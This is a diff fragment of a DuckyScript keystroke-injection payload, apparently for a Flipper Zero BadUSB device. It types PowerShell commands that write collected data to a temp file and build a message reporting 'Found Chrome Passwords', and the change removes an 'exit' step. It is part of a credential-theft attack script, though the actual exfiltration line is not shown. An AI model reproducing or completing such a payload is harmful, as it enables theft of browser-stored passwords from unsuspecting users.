@@ -61,9 +61,6 @@ ENTER
 DELAY 700
 STRING $r | Out-File -FilePath temp.txt
 ENTER
-DELAY 500
-STRING exit
-ENTER
 DELAY 600
 STRING $content='Flipper Flap Feport Found Chrome Passwords'; $payload=[PSCustomObject]@{ content=$content }
 ENTER
